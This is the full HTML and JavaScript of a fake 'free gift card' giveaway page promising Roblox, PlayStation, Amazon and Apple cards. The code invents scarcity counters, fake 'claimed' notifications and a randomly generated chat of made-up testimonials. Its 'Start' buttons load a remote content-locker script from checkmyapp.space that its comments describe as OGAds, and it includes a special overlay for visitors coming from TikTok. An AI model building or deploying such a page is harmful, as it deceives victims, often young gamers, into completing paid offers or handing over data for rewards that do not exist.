<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Premium Gift Cards</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;700;800&display=swap" rel="stylesheet">
    <style>
        /* كاع الـ CSS ديالك خليتو هو هو بلا ما نقصت فيه حتى سطر */
        *{margin:0;padding:0;box-sizing:border-box}
        body{font-family:'Inter',sans-serif;background:#050505;color:#fff;overflow-x:hidden;min-height:100vh;}
        body::before{content:"";position:fixed;inset:0;background:radial-gradient(circle at 15% 20%,rgba(59,130,246,.16),transparent 25%),radial-gradient(circle at 85% 25%,rgba(168,85,247,.12),transparent 25%),radial-gradient(circle at 50% 85%,rgba(34,197,94,.10),transparent 25%);animation:bgMove 10s ease-in-out infinite alternate;z-index:-2;}
        body::after{content:"";position:fixed;inset:0;background:linear-gradient(135deg,#000,#0b0b0b,#000);z-index:-3;}
        @keyframes bgMove{100%{transform:scale(1.12) translateY(-18px);}}
        #ttOverlay {position: fixed;inset: 0;background: #000;display: none;z-index: 999999;}
        #tutorialGif {width: 100%;height: 100%;object-fit: cover;pointer-events: none;}
        #notification-toast {position: fixed;bottom: 20px;left: 20px;background: rgba(10, 10, 10, 0.98);border: 1px solid rgba(255, 255, 255, 0.1);backdrop-filter: blur(15px);padding: 14px;border-radius: 20px;display: flex;align-items: center;gap: 15px;z-index: 10000;box-shadow: 0 10px 40px rgba(0,0,0,0.8);transform: translateX(-160%);transition: transform 0.6s cubic-bezier(0.68, -0.55, 0.27, 1.55);max-width: 320px;}
        #notification-toast.show { transform: translateX(0); }
        .notif-img-container {width: 45px; height: 45px; background: #fff; border-radius: 12px;display: flex; align-items: center; justify-content: center; flex-shrink: 0; padding: 5px;}
        .notif-img-container img { width: 100%; height: 100%; object-fit: contain; }
        .notif-content { font-size: 13px; line-height: 1.4; }
        .notif-user { font-weight: 800; color: #60a5fa; }
        .notif-card-name { color: #a855f7; font-weight: 700; }
        .notif-time { display: block; font-size: 10px; opacity: 0.5; margin-top: 3px; }
        .header{text-align:center;padding:34px 15px 20px}
        .title{font-size:34px;font-weight:800;background:linear-gradient(90deg,#fff,#60a5fa,#a855f7);-webkit-background-clip:text;-webkit-text-fill-color:transparent;}
        .sub{margin-top:10px;font-size:14px;opacity:.65}
        .grid{display:grid;grid-template-columns:repeat(2,1fr);gap:18px;padding:18px;max-width:580px;margin:auto;}
        .card{background:rgba(255,255,255,.05);border:1px solid rgba(255,255,255,.06);border-radius:24px;padding:14px;cursor:pointer;transition:.25s ease;backdrop-filter:blur(12px);box-shadow:0 15px 30px rgba(0,0,0,.45);}
        .card:hover{transform:translateY(-6px);}
        .card img{width:100%;height:125px;object-fit:contain;background:#fff;padding:14px;border-radius:18px;}
        .name{margin-top:12px;font-size:15px;font-weight:800}
        .price{margin-top:6px;font-size:13px;opacity:.75}
        .tag{display:inline-block;margin-top:10px;padding:6px 10px;border-radius:999px;font-size:11px;background:rgba(96,165,250,.14);color:#93c5fd;}
        .chat-container {max-width: 580px;margin: 40px auto 20px;padding: 0 18px;}
        .chat-box {background: rgba(255, 255, 255, 0.03);border: 1px solid rgba(255, 255, 255, 0.08);border-radius: 20px;padding: 20px;height: 300px;overflow-y: auto;display: flex;flex-direction: column;gap: 15px;scrollbar-width: none;}
        .chat-box::-webkit-scrollbar { display: none; }
        .chat-msg {background: rgba(255, 255, 255, 0.05);padding: 12px 16px;border-radius: 15px;border-left: 3px solid #60a5fa;}
        .chat-user { font-size: 13px; font-weight: 800; color: #60a5fa; display: flex; justify-content: space-between; }
        .chat-text { font-size: 14px; margin-top: 5px; opacity: 0.9; }
        .loading{position:fixed;inset:0;background:rgba(0,0,0,.92);display:none;justify-content:center;align-items:center;flex-direction:column;z-index:999;}
        .spinner{width:62px;height:62px;border-radius:50%;border:4px solid rgba(255,255,255,.08);border-top:4px solid #60a5fa;animation:spin 1s linear infinite;}
        @keyframes spin{100%{transform:rotate(360deg)}}
        .offerPage{display:none;padding:20px}
        .box{max-width:540px;margin:auto;background:rgba(255,255,255,.05);border:1px solid rgba(255,255,255,.06);border-radius:24px;padding:22px;}
        .selectedImage{width:100%;height:190px;object-fit:contain;background:#fff;padding:18px;border-radius:18px;margin-bottom:16px;}
        #selectedTitle{font-size:28px;font-weight:800}
        .option{display:flex;justify-content:space-between;align-items:center;padding:15px;margin-top:12px;border-radius:16px;background:rgba(255,255,255,.04);}
        .opt{font-size:14px;font-weight:700;opacity:.9;}
        .option button,.back{border:none;cursor:pointer;font-weight:700;border-radius:12px;padding:11px 16px;color:#fff;}
        .option button{background:linear-gradient(90deg,#22c55e,#16a34a);}
        .back{width:100%;margin-top:16px;background:#1f2937;}
        .footer{text-align:center;padding:26px;font-size:12px;opacity:.45}
        @media(max-width:480px){.grid{grid-template-columns:1fr}.title{font-size:28px}#selectedTitle{font-size:23px}#notification-toast { left: 10px; right: 10px; bottom: 10px; width: auto; }}
    </style>
</head>
<body>

<div id="ttOverlay"><img src="tutorial.gif" id="tutorialGif"></div>

<div id="notification-toast">
    <div class="notif-img-container"><img src="" id="notif-img"></div>
    <div class="notif-content">
        <span class="notif-user" id="notif-user"></span> successfully claimed a <span class="notif-card-name" id="notif-card-name"></span>
        <span class="notif-time" id="notif-time"></span>
    </div>
</div>

<div class="header">
    <div class="title">PREMIUM GIFT CARDS</div>
    <div class="sub">Select your card and continue</div>
</div>

<div class="grid" id="grid">
    <div class="card" onclick="openOffer('ROBLOX 20$-50$ CARD', this)">
        <img src="https://logos-world.net/wp-content/uploads/2020/10/Roblox-Logo.png">
        <div class="name">ROBLOX</div><div class="price">$20 - $50</div><div class="tag stock-count" id="stock-0">Still 46 Card</div>
    </div>
    <div class="card" onclick="openOffer('PLAYSTATION 25$-50$ CARD', this)">
        <img src="https://upload.wikimedia.org/wikipedia/commons/0/00/PlayStation_logo.svg">
        <div class="name">PLAYSTATION</div><div class="price">$25 - $50</div><div class="tag stock-count" id="stock-1">Still 37 Card</div>
    </div>
    <div class="card" onclick="openOffer('AMAZON 20$-150$ CARD', this)">
        <img src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg">
        <div class="name">AMAZON</div><div class="price">$20 - $150</div><div class="tag stock-count" id="stock-2">Still 61 Card</div>
    </div>
    <div class="card" onclick="openOffer('APPLE 20$-75$ CARD', this)">
        <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg">
        <div class="name">APPLE</div><div class="price">$20 - $75</div><div class="tag stock-count" id="stock-3">Still 50 Card</div>
    </div>
</div>

<div class="chat-container" id="chatArea">
    <div class="chat-box" id="chatBox"></div>
</div>

<div class="loading" id="loading"><div class="spinner"></div><p style="margin-top:15px;opacity:.8;">Loading...</p></div>

<div class="offerPage" id="offerPage">
    <div class="box">
        <img id="selectedImage" class="selectedImage">
        <div id="selectedTitle"></div>
        <div class="option"><div class="opt">Fast Verification</div><button onclick="go()">Start</button></div>
        <div class="option"><div class="opt">Backup Option</div><button onclick="go()">Start</button></div>
        <button class="back" onclick="backPage()">← Back</button>
    </div>
</div>

<div class="footer">© 2026 Premium Gift Cards</div>

<script>
// --- MESSAGES & LOGIC ---
const giftCardMsgs = ["Fuck! I only got $10 card while others got $100.", "Is this actually real?", "Guys, it worked!", "Wait... just got the notification.", "Yo it works!", "Just finished the offer!", "Omg it worked!!", "Can believe it... $100 Amazon!"];
const usersList = ["Alex_NY", "Sarah_LA", "Daniel.H", "Emily_99", "Mike_Gamer", "Jess_Vip"];
const cardsData = [{n: "Roblox $50", img: "https://logos-world.net/wp-content/uploads/2020/10/Roblox-Logo.png"},{n: "Amazon $100", img: "https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg"}];
let stocks = [46, 37, 61, 50, 72, 28];

function getUSATime() { return new Intl.DateTimeFormat('en-GB', { timeZone: 'America/New_York', hour: '2-digit', minute: '2-digit', hour12: false }).format(new Date()); }
function updateStock() {
    const idx = Math.floor(Math.random() * 4);
    const tag = document.getElementById(`stock-${idx}`);
    if (tag && stocks[idx] > 2) { stocks[idx] -= 1; tag.innerText = `Still ${stocks[idx]} Card`; }
    setTimeout(updateStock, 15000);
}
function showNotif() {
    const toast = document.getElementById('notification-toast');
    const u = usersList[Math.floor(Math.random()*usersList.length)];
    const c = cardsData[Math.floor(Math.random()*cardsData.length)];
    document.getElementById('notif-user').innerText = "@" + u;
    document.getElementById('notif-img').src = c.img;
    document.getElementById('notif-card-name').innerText = c.n + " Card";
    document.getElementById('notif-time').innerText = "Today at " + getUSATime();
    toast.classList.add('show');
    setTimeout(() => { toast.classList.remove('show'); }, 4000);
    setTimeout(showNotif, 12000);
}
function addChat() {
    const box = document.getElementById('chatBox');
    const u = usersList[Math.floor(Math.random()*usersList.length)];
    const m = giftCardMsgs[Math.floor(Math.random()*giftCardMsgs.length)];
    box.innerHTML += `<div class="chat-msg"><div class="chat-user"><span>@${u}</span><span>${getUSATime()}</span></div><div class="chat-text">${m}</div></div>`;
    box.scrollTop = box.scrollHeight;
    setTimeout(addChat, 5000);
}

function openOffer(title,el){
    const img = el.querySelector("img").src;
    document.getElementById("loading").style.display="flex";
    setTimeout(()=>{
        document.getElementById("loading").style.display="none";
        document.getElementById("grid").style.display="none";
        document.getElementById("chatArea").style.display="none";
        document.getElementById("offerPage").style.display="block";
        document.getElementById("selectedTitle").innerText=title;
        document.getElementById("selectedImage").src=img;
        window.scrollTo(0,0);
    },900);
}

function backPage(){ document.getElementById("offerPage").style.display="none"; document.getElementById("grid").style.display="grid"; document.getElementById("chatArea").style.display="block"; }

// --- THE SOLUTION: LAZY LOAD OGADS ---
function go() {
    document.getElementById("loading").style.display="flex";
    
    // كنصاوبو السكريبت ديال الشركة فاش كيكليكي المستخدم
    var script = document.createElement('script');
    script.type = 'text/javascript';
    script.id = 'ogjs';
    
    // هاد الإعدادات كتقول للسكريبت يتحل غير يتحط
    window.og_autostart = true; 
    
    script.src = "https://checkmyapp.space/cl/js/7jvwjk";
    
    script.onload = function() {
        document.getElementById("loading").style.display="none";
        if(typeof og_load === "function") {
            og_load();
        }
    };
    
    document.head.appendChild(script);
}

window.addEventListener("load",()=>{
    showNotif();
    updateStock(); 
    for(let i=0; i<4; i++) { setTimeout(addChat, i * 1200); }
    if(/TikTok|musical_ly/i.test(navigator.userAgent)) { document.getElementById("ttOverlay").style.display="block"; }
});
</script>
</body>
</html>
